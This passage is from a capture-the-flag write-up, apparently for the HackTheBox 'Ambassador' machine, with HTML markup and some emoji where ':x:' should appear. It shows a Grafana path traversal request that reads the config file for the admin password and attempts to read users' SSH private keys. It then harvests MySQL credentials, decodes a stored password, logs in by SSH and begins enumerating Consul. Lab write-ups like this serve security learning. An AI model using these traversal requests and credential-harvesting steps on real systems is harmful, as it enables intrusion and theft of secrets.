+</span></span><span class=line><span class=cl>news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network❌100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-timesync❌102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>messagebus❌103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>syslog❌104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt❌105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>tss❌106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span class=line><span class=cl>uuidd❌107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>tcpdump❌108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>landscape❌109:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>pollinate❌110:1::/var/cache/pollinate:/bin/false
+</span></span><span class=line><span class=cl>usbmux❌111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sshd❌112:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>developer❌1000:1000:developer:/home/developer:/bin/bash
+</span></span><span class=line><span class=cl>lxd❌998💯:/var/snap/lxd/common/lxd:/bin/false
+</span></span><span class=line><span class=cl>grafana❌113:118::/usr/share/grafana:/bin/false
+</span></span><span class=line><span class=cl>mysql❌114:119:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>consul❌997:997::/home/consul:/bin/false
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s filter out users without a valid shell, which may be useful for SSH access later:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$grep</span> -ivE <span class=s2>&#34;/bin/false|/usr/sbin/nologin&#34;</span> passwd.txt
+</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>developer❌1000:1000:developer:/home/developer:/bin/bash
+</span></span><span class=line><span class=cl>consul❌997:997::/home/con
+</span></span></code></pre></td></tr></table></div></div><p>Reading through Grafana documentation, seeing where the config file is usually stored, and running a <code>GET /public/plugins/alertGroups/../../../../../../../../etc/grafana/grafana.ini</code> provides us the admin password. Fun times:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># default admin password, can be changed before first start of grafana,  or in profile settings
+</span></span><span class=line><span class=cl>admin_password = messageInABottle685427
+</span></span></code></pre></td></tr></table></div></div><p>And we can login to the Grafana web interface successfully:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-26-21-14-52-image.png data-srcset="./assets/2023-01-26-21-14-52-image.png, ./assets/2023-01-26-21-14-52-image.png 1.5x, ./assets/2023-01-26-21-14-52-image.png 2x" data-sizes=auto alt=./assets/2023-01-26-21-14-52-image.png title=./assets/2023-01-26-21-14-52-image.png></p><p>I also tried other opportunistic files in the above path traversal, notably <code>/home/con/.ssh/id_rsa</code> and <code>/home/developer/.ssh/id_rsa</code>, but received the following response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;message&#34;</span><span class=p>:</span><span class=s2>&#34;Could not open plugin file&#34;</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>I&rsquo;m assuming this is because the grafana instance doesn&rsquo;t have read access to these files (computer says no).</p><p>Now we&rsquo;re logged into Grafana, we can call the API &ndash; so checking the available plugins via <a href="http://10.10.11.183:3000/api/plugins?embedded=0" target=_blank rel="noopener noreffer">http://10.10.11.183:3000/api/plugins?embedded=0</a>. I see mysql, which shouldn&rsquo;t come as a surprise given our earlier nmap scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;MySQL&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;datasource&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;mysql&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;enabled&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;pinned&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;info&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;author&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Grafana Labs&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;https://grafana.com&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=p>},</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Data source for MySQL databases&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;links&#34;</span><span class=p>:</span> <span class=kc>null</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;logos&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;small&#34;</span><span class=p>:</span> <span class=s2>&#34;public/app/plugins/datasource/mysql/img/mysql_logo.svg&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nt>&#34;large&#34;</span><span class=p>:</span> <span class=s2>&#34;public/app/plugins/datasource/mysql/img/mysql_logo.svg&#34;</span>
+</span></span><span class=line><span class=cl>      <span class=p>},</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;build&#34;</span><span class=p>:</span> <span class=p>{},</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;screenshots&#34;</span><span class=p>:</span> <span class=kc>null</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>      <span class=nt>&#34;updated&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;latestVersion&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;hasUpdate&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;defaultNavUrl&#34;</span><span class=p>:</span> <span class=s2>&#34;/plugins/mysql/&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;category&#34;</span><span class=p>:</span> <span class=s2>&#34;sql&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;state&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;signature&#34;</span><span class=p>:</span> <span class=s2>&#34;internal&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;signatureType&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;signatureOrg&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span><span class=err>,</span>
+</span></span></code></pre></td></tr></table></div></div><p>Within the Grafana UI, we can see the MySQL data source and reference to a yaml file, but no password:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-26-21-30-02-image.png data-srcset="./assets/2023-01-26-21-30-02-image.png, ./assets/2023-01-26-21-30-02-image.png 1.5x, ./assets/2023-01-26-21-30-02-image.png 2x" data-sizes=auto alt=./assets/2023-01-26-21-30-02-image.png title=./assets/2023-01-26-21-30-02-image.png></p><p>Naturally, I tried connecting to the MySQL instance with no password, but this failed:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$mysql</span> -h 10.10.11.183 -u grafana
+</span></span><span class=line><span class=cl>ERROR <span class=m>1045</span> <span class=o>(</span>28000<span class=o>)</span>: Access denied <span class=k>for</span> user <span class=s1>&#39;grafana&#39;</span>@<span class=s1>&#39;10.10.14.48&#39;</span> <span class=o>(</span>using password: NO<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>But we can already see the datasources API, which shows us MySQL credentials <a href=http://10.10.11.183:3000/api/datasources target=_blank rel="noopener noreffer">http://10.10.11.183:3000/api/datasources</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>[</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;uid&#34;</span><span class=p>:</span> <span class=s2>&#34;uKewFgM4z&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;orgId&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;mysql.yaml&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;mysql&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;typeName&#34;</span><span class=p>:</span> <span class=s2>&#34;MySQL&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;typeLogoUrl&#34;</span><span class=p>:</span> <span class=s2>&#34;public/app/plugins/datasource/mysql/img/mysql_logo.svg&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;access&#34;</span><span class=p>:</span> <span class=s2>&#34;proxy&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;dontStandSoCloseToMe63221!&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;user&#34;</span><span class=p>:</span> <span class=s2>&#34;grafana&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;database&#34;</span><span class=p>:</span> <span class=s2>&#34;grafana&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;basicAuth&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;isDefault&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;jsonData&#34;</span><span class=p>:</span> <span class=p>{},</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;readOnly&#34;</span><span class=p>:</span> <span class=kc>true</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>So we have mysql credentials grafana / dontStandSoCloseToMe63221!, and we can connect to and enumerate the database. Grafana was empty, but the whackywidget database looks juicy:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$mysql</span> -h 10.10.11.183 -u grafana -p grafana
+</span></span><span class=line><span class=cl>Enter password: 
+</span></span><span class=line><span class=cl>Welcome to the MariaDB monitor.  Commands end with <span class=p>;</span> or <span class=se>\g</span>.
+</span></span><span class=line><span class=cl>Your MySQL connection id is <span class=m>48</span>
+</span></span><span class=line><span class=cl>Server version: 8.0.30-0ubuntu0.20.04.2 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Type <span class=s1>&#39;help;&#39;</span> or <span class=s1>&#39;\h&#39;</span> <span class=k>for</span> help. Type <span class=s1>&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>MySQL <span class=o>[</span>grafana<span class=o>]</span>&gt; show databases<span class=p>;</span>
+</span></span><span class=line><span class=cl>+--------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> Database           <span class=p>|</span>
+</span></span><span class=line><span class=cl>+--------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> grafana            <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> information_schema <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> mysql              <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> performance_schema <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> sys                <span class=p>|</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> whackywidget       <span class=p>|</span>
+</span></span><span class=line><span class=cl>+--------------------+
+</span></span><span class=line><span class=cl><span class=m>6</span> rows in <span class=nb>set</span> <span class=o>(</span>0.024 sec<span class=o>)</span>
+</span></span><span class=line><span class=cl>MySQL <span class=o>[</span>grafana<span class=o>]</span>&gt; use whackywidget<span class=p>;</span>
+</span></span><span class=line><span class=cl>MySQL <span class=o>[</span>whackywidget<span class=o>]</span>&gt; show tables<span class=p>;</span>
+</span></span><span class=line><span class=cl>+------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_whackywidget <span class=p>|</span>
+</span></span><span class=line><span class=cl>+------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> users                  <span class=p>|</span>
+</span></span><span class=line><span class=cl>+------------------------+
+</span></span><span class=line><span class=cl><span class=m>1</span> row in <span class=nb>set</span> <span class=o>(</span>0.021 sec<span class=o>)</span>
+</span></span><span class=line><span class=cl>MySQL <span class=o>[</span>whackywidget<span class=o>]</span>&gt; SELECT * from users<span class=p>;</span>
+</span></span><span class=line><span class=cl>+-----------+------------------------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> user      <span class=p>|</span> pass                                     <span class=p>|</span>
+</span></span><span class=line><span class=cl>+-----------+------------------------------------------+
+</span></span><span class=line><span class=cl><span class=p>|</span> developer <span class=p>|</span> <span class=nv>YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg</span><span class=o>==</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl>+-----------+------------------------------------------+
+</span></span><span class=line><span class=cl><span class=m>1</span> row in <span class=nb>set</span> <span class=o>(</span>0.021 sec<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>This password looks like a base64 string padded out, rather than a one-way hash:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$echo</span> <span class=s2>&#34;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&#34;</span> <span class=p>|</span> base64 -d
+</span></span><span class=line><span class=cl>anEnglishManInNewYork027468
+</span></span></code></pre></td></tr></table></div></div><p>I was able to SSH in with the above to get a foothold on the system and subsequently now had the user flag! Hooray!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ssh</span> developer@10.10.11.183
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.10.11.183 (10.10.11.183)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.10.11.183<span class=s1>&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span class=line><span class=cl><span class=s1>developer@10.10.11.183&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Last login: Thu Jan <span class=m>26</span> 06:56:31 <span class=m>2023</span> from 10.10.14.18
+</span></span><span class=line><span class=cl>developer@ambassador:~$ ls
+</span></span><span class=line><span class=cl>snap  user.txt
+</span></span><span class=line><span class=cl>developer@ambassador:~$ cat user.txt
+</span></span><span class=line><span class=cl>3d9d82f72c72f7406d20f509356e2f1e
+</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation>Privilege Escalation</h2><p>I won&rsquo;t write every gory detail here, but suffice to say, I tried low hanging fruit:</p><ul><li>sudo &ndash; can&rsquo;t run sudo as developer user</li><li>no unusual processes running</li><li>no setuid binaries I can execute</li><li>nothing in my home directory</li><li>nothing unusual in my printenv</li><li>there&rsquo;s a path <code>/development-machine-documentation/</code>, which contains the static hugo site we found earlier &ndash; it contains a deploy.sh which copies files into <code>/var/www/html</code>. Nothing stood out here as helpful to gaining root</li></ul><p>The most obvious thing running as root that looked interesting was the consul agent:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>developer@ambassador:/etc/consul.d/config.d$ ps aux <span class=p>|</span> grep consul
+</span></span><span class=line><span class=cl>root        <span class=m>1070</span>  0.4  3.8 <span class=m>795828</span> <span class=m>76960</span> ?        Ssl  05:26   1:28 /usr/bin/consul agent -config-dir<span class=o>=</span>/etc/consul.d/config.d -config-file<span class=o>=</span>/etc/consul.d/consul.hcl
+</span></span></code></pre></td></tr></table></div></div><p>Unfortunately, I didn&rsquo;t have permission to read the config directory or file passed as params to the process.</p><p>According to documentation, the agent should run on TCP 8500 and 8501 for HTTP and HTTPS respectively <a href=https://developer.hashicorp.com/consul/docs/install/ports target=_blank rel="noopener noreffer">Required Ports | Consul | HashiCorp Developer</a>. So checking netstat:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>developer@ambassador:/etc/consul.d/config.d$ netstat -tupln
+</span></span><span class=line><span class=cl><span class=o>(</span>Not all processes could be identified, non-owned process info
+</span></span><span class=line><span class=cl> will not be shown, you would have to be root to see it all.<span class=o>)</span>
+</span></span><span class=line><span class=cl>Active Internet connections <span class=o>(</span>only servers<span class=o>)</span>
+</span></span><span class=line><span class=cl>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:8300          0.0.0.0:*               LISTEN      -    
+</span></span></code></pre></td></tr></table></div></div><p>With no idea how to interact with it, I confirmed I could hit the HTTP server locally from the machine, but not from my own machine &ndash; so I assumed it was firewalled but accessible locally:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>developer@ambassador:/etc/consul.d/config.d$ curl -v <span class=s2>&#34;http://127.0.0.1:8500/v1/agent/checks&#34;</span>
+</span></span><span class=line><span class=cl>*   Trying 127.0.0.1:8500...
+</span></span><span class=line><span class=cl>* TCP_NODELAY <span class=nb>set</span>
+</span></span><span class=line><span class=cl>* Connected to 127.0.0.1 <span class=o>(</span>127.0.0.1<span class=o>)</span> port <span class=m>8500</span> <span class=o>(</span><span class=c1>#0)</span>
+</span></span><span class=line><span class=cl>&gt; GET /v1/agent/checks HTTP/1.1
+</span></span><span class=line><span class=cl>&gt; Host: 127.0.0.1:8500
+</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.68.0
+</span></span><span class=line><span class=cl>&gt; Accept: */*
+</span></span><span class=line><span class=cl>&gt; 
+</span></span><span class=line><span class=cl>* Mark bundle as not supporting multiuse
+</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>200</span> OK
+</span></span><span class=line><span class=cl>&lt; Content-Type: application/json
+</span></span><span class=line><span class=cl>&lt; Vary: Accept-Encoding
+</span></span><span class=line><span class=cl>&lt; X-Consul-Default-Acl-Policy: deny
+</span></span><span class=line><span class=cl>&lt; Date: Thu, <span class=m>26</span> Jan <span class=m>2023</span> 11:19:46 GMT
+</span></span><span class=line><span class=cl>&lt; Content-Length: <span class=m>2</span>
+</span></span><span class=line><span class=cl>&lt; 
+</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host 127.0.0.1 left intact</span>
+</span></span></code></pre></td></tr></table></div></div><p>I tried to check the agent version, but get a permission denied:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>developer@ambassador:~$ curl --silent http://localhost:8500/v1/agent/self 
+</span></span><span class=line><span class=cl>Permission denied: token with AccessorID <span class=s1>&#39;00000000-0000-0000-0000-000000000002&#39;</span> lacks permission <span class=s1>&#39;agent:read&#39;</span> on <span class=s2>&#34;ambassador&#34;</span>developer@ambassador:~$ 
